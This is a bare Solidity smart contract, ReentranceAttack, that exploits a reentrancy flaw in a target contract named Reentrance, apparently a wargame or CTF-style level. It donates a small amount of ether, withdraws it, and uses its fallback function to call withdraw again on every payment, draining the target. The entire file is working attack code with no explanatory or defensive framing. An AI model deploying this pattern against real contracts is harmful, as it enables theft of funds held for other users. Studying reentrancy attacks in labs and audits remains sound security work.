contract ReentranceAttack {
    Reentrance reentrance;

    constructor(address payable _reentrance) payable {
        reentrance = Reentrance(_reentrance);
    }

    function attack() public {
        reentrance.donate{value: 0.001 ether}(address(this));
        reentrance.withdraw(0.001 ether);
    }

    fallback() external payable {
        reentrance.withdraw(0.001 ether);
    }
}
